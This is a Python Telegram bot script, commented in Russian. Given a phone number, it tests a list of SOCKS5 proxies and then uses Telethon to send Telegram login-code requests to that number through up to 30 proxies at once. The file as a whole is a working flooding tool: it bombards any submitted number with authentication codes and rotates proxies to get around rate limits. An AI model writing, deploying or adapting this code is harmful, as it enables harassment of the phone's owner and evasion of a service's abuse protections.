# d.py — рабочая версия с улучшенной проверкой прокси и безопасным использованием Telethon
import os
import ssl
import socks
import socket
import asyncio
import threading
from concurrent.futures import ThreadPoolExecutor
from functools import partial
from flask import Flask
from telethon import TelegramClient
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# ========== Настройки ==========
PROXIES_FILE = "proxies.txt"
OK_PROXIES_FILE = "ok_proxies.txt"
# увеличил таймауты — многие прокси медленные
TCP_TIMEOUT = 2.0
SSL_TIMEOUT = 3.0
WORKERS = 40
MAX_SEND_PER_REQUEST = 30
SEND_CONCURRENCY = 6
DELAY_BETWEEN_ATTEMPTS = 0.25
# =============================

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID") or 0)
API_HASH = os.environ.get("API_HASH")
if not BOT_TOKEN or not API_ID or not API_HASH:
    raise RuntimeError("Установите переменные окружения BOT_TOKEN, API_ID, API_HASH")

# --- чтение proxies.txt ---
def load_proxies(filename=PROXIES_FILE):
    proxies = []
    if not os.path.exists(filename):
        return proxies
    with open(filename, "r", encoding="utf-8") as f:
        for line in f:
            s = line.strip()
            if not s:
                continue
            # допускаем строки вида socks5://ip:port или ip:port
            if s.startswith("socks5://"):
                s = s[len("socks5://"):]
            if s.startswith("socks4://"):
                s = s[len("socks4://"):]
            if ":" not in s:
                continue
            ip, port = s.split(":", 1)
            try:
                port = int(port)
            except Exception:
                continue
            proxies.append((ip.strip(), port))
    return proxies

# --- синхронная проверка одного proxy: TCP + SSL handshake (попытка SOCKS5) ---
def check_proxy_sync(ip: str, port: int, tcp_timeout=TCP_TIMEOUT, ssl_timeout=SSL_TIMEOUT) -> bool:
    s = socks.socksocket()
    try:
        s.set_proxy(socks.SOCKS5, ip, port, rdns=True)
        s.settimeout(tcp_timeout)
        s.connect(("149.154.167.99", 443))  # IP Telegram, обходим DNS
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False
    try:
        s.settimeout(ssl_timeout)
        ctx = ssl.create_default_context()
        ss = ctx.wrap_socket(s, server_hostname="api.telegram.org")
        ss.do_handshake()
        ss.close()
        return True
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False

# --- асинхронно фильтруем рабочие прокси ---
async def filter_working_proxies(proxies, workers=WORKERS):
    if not proxies:
        return []
    loop = asyncio.get_running_loop()
    good = []
    with ThreadPoolExecutor(max_workers=min(workers, len(proxies))) as ex:
        tasks = [loop.run_in_executor(ex, partial(check_proxy_sync, ip, port)) for ip, port in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    for (ip, port), r in zip(proxies, results):
        if r is True:
            good.append((ip, port))
    return good

# --- Telegram handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Пришлите номер в формате +79998887766")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.startswith("+") or not phone[1:].isdigit():
        await update.message.reply_text("Неверный формат. Пример: +79998887766")
        return

    msg = await update.message.reply_text("Принял. Проверяю прокси и отправляю коды...")

    proxies = load_proxies(PROXIES_FILE)
    if not proxies:
        await msg.edit_text("Нет прокси в файле proxies.txt")
        return

    good = await filter_working_proxies(proxies)
    with open(OK_PROXIES_FILE, "w", encoding="utf-8") as f:
        for ip, port in good:
            f.write(f"{ip}:{port}\n")

    sent = 0
    to_try = good[:MAX_SEND_PER_REQUEST]

    sem = asyncio.Semaphore(SEND_CONCURRENCY)

    async def try_send_via_proxy(ip, port):
        nonlocal sent
        proxy = (socks.SOCKS5, ip, port)
        session = f"session_{ip.replace('.', '_')}_{port}"
        async with sem:
            try:
                # Создаём клиент, подключаемся явно (без интерактивного start())
                client = TelegramClient(session, API_ID, API_HASH, proxy=proxy)
                await client.connect()
                try:
                    if not await client.is_user_authorized():
                        # timeout на отправку code_request, чтобы не зависнуть
                        try:
                            await asyncio.wait_for(client.send_code_request(phone), timeout=12)
                            sent += 1
                            print(f"[ok] code_request через {ip}:{port}")
                        except asyncio.TimeoutError:
                            print(f"[warn] send_code_request timeout via {ip}:{port}")
                        except Exception as e_inner:
                            print(f"[warn] send_code_request failed via {ip}:{port}: {e_inner}")
                finally:
                    await client.disconnect()
            except Exception as e:
                # логируем причину — поможет понять, что именно неверно с прокси
                print(f"[warn] Не удалось подключиться Telethon через {ip}:{port}: {repr(e)}")

    tasks = []
    for ip, port in to_try:
        tasks.append(asyncio.create_task(try_send_via_proxy(ip, port)))
        await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)

    if tasks:
        await asyncio.gather(*tasks)

    await msg.edit_text(f"Готово. Рабочих прокси: {len(good)}. Кодов отправлено (попыток): {sent}.")

# --- создаём и запускаем бот ---
def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    return app

# --- Flask чтобы Render видел открытый порт (фон) ---
flask_app = Flask(__name__)

@flask_app.route("/", methods=["GET"])
def index():
    return "OK", 200

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host="0.0.0.0", port=port)

def ensure_event_loop():
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

def main():
    t = threading.Thread(target=run_flask, daemon=True, name="flask_bg")
    t.start()

    app = build_app()
    ensure_event_loop()
    try:
        print("Бот запускается (polling)...")
        app.run_polling()
    except Exception as e:
        print("Ошибка при запуске бота:", e)

if __name__ == "__main__":
    main()
